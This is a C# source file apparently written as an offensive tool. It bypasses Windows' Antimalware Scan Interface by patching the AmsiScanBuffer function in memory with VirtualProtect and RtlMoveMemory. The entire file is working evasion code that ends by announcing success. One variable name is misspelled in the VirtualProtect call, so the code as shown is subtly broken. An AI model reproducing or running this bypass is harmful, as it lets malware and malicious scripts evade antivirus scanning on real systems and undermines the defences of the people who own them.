using System;
using System.Runtime.InteropServices;

namespace Bypass
{
    public class Amsi
    {
        //implement required kernel32.dll functions 
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static int Patch()
        {
            //Get pointer for the amsi.dll        
            IntPtr TargetDLL = LoadLibrary("amsi.dll");
            if (TargetDLL == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: Could not retrieve amsi.dll pointer!");
                return 1;
            }

            //Get pointer for the AmsiScanBuffer function
            IntPtr AmsiScanBufrPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer");
            if (AmsiScanBufrPtr == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: Could not retrieve AmsiScanBuffer function pointer!");
                return 1;
            }

            /*
             *  Apply memory patching as described by Cyberark here:          
             *  https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/
             */
            UIntPtr dwSize = (UIntPtr)4;
            uint Zero = 0;

            //Pointer changing the AmsiScanBuffer memory protection from readable only to writeable (0x40)
            if (!VirtualProtect(AmsiScanBufPtr, dwSize, 0x40, out Zero))
            {
                Console.WriteLine("ERROR: Could not modify AmsiScanBuffer memory permissions!");
                return 1;
            }

            Byte[] Patch = { 0x31, 0xff, 0x90 }; //The new patch opcode

            //Setting a pointer to the patch opcode array (unmanagedPointer)
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, unmanagedPointer, 3);

            //Patching the relevant line (the line which submits the rd8 to the edi register) with the xor edi,edi opcode
            MoveMemory(AmsiScanBufrPtr + 0x001b, unmanagedPointer, 3); 

            Console.WriteLine("Great success. AmsiScanBuffer patched! :)");
            return 0;
        }
    }
}
